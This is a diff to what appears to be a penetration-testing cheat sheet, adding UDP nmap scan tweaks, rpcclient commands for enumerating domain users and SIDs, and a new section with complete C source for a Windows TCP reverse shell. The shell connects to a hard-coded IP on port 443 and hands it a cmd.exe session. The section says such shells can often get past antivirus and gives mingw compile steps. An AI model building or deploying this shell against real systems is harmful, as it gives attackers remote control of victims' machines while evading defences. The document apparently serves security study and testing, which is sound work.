@@ -81,6 +81,7 @@ Other great cheetsheets:
     - [5.4.3. Turn off Windows Defender](#543-turn-off-windows-defender)
     - [5.4.4. Windows LOLBAS Encoding/Decoding](#544-windows-lolbas-encodingdecoding)
     - [5.4.5. Execute Inline Tasks with MSBuild.exe](#545-execute-inline-tasks-with-msbuildexe)
+    - [5.4.6. Custom Windows TCP Reverse Shell](#546-custom-windows-tcp-reverse-shell)
   - [5.5. Windows UAC Bypass](#55-windows-uac-bypass)
   - [5.6. Windows Pass-The-Hash Attacks](#56-windows-pass-the-hash-attacks)
   - [5.7. Windows Token Impersonation](#57-windows-token-impersonation)
@@ -176,10 +177,10 @@ sudo masscan -p1-65535 $VICTIM_IP --rate=1000 -e tun0 > masscan.txt
 tcpports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\n' ',' | sed 's/,$//')
 sudo nmap -n -p $tcpports -oA nmap/tcp-all -Pn --script "default,safe,vuln" -sV $VICTIM_IP
 
-# UDP fast scan
-sudo nmap -n -v -sU -F -T4 --reason -T4 -oA nmap/udp-fast $VICTIM_IP
-# top 50 UDP ports
-sudo nmap -n -v -sU -T4 --top-ports=50 --reason -oA nmap/udp-top50 $VICTIM_IP
+# UDP fast scan (top 100)
+sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast $VICTIM_IP
+# top 20 UDP ports
+sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 $VICTIM_IP
 
 # specifying safe and wildcard ftp-* scripts
 # logic: and, or, not all work. "," is like "or"
@@ -518,6 +519,14 @@ rpcclient $VICTIM_IP -U "" -N
 rpcclient $VICTIM_IP -W DOMAIN -U username -P password
 # from here can enumerate users, groups, etc.
 # (netshareenum, lookupnames, lookupsids, enumdomusers, ...)
+querydispinfo     # list users
+enumdomusers      # list users
+enumdomgroups     # list groups
+enumdomains       # list domains
+querydominfo      # domain info
+lsaquery          # get SIDs
+lsaenumsid        # get SIDs
+lookupsids <sid>  # lookup SID
 ```
 
 ## 3.13. 445 - SMB Enumeration
@@ -1677,6 +1686,65 @@ with Empire)
     </Task>
   </UsingTask>
 </Project>
+```
+
+### 5.4.6. Custom Windows TCP Reverse Shell
+
+A custom reverse shell can often get past antivirus.
+
+```c
+/* Win32 TCP reverse cmd.exe shell
+ * References:
+ * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
+ * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+ * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
+ * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
+ * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)
+ */
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+#define TARGET_IP   "192.168.119.144"
+#define TARGET_PORT 443
+
+void main(void) {
+  SOCKET s;
+  WSADATA wsa;
+  STARTUPINFO si;
+  struct sockaddr_in sa;
+  PROCESS_INFORMATION pi;
+
+  WSAStartup(MAKEWORD(2,2), &wsa);
+  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+  sa.sin_family = AF_INET;
+  sa.sin_addr.s_addr = inet_addr(TARGET_IP);
+  sa.sin_port = htons(TARGET_PORT);
+  WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
+  SecureZeroMemory(&si, sizeof(si));
+  si.cb = sizeof(si);
+  si.dwFlags = STARTF_USESTDHANDLES;
+  si.hStdInput = (HANDLE)s;
+  si.hStdOutput = (HANDLE)s;
+  si.hStdError = (HANDLE)s;
+  CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+}
+```
+
+To compile on Kali (as 32-bit binary because it works on both 32- and 64-bit):
+
+```sh
+sudo dpkg --add-architecture i386
+sudo apt update
+sudo apt install mingw-w64 wine
+i686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32
 ```
 
 ## 5.5. Windows UAC Bypass
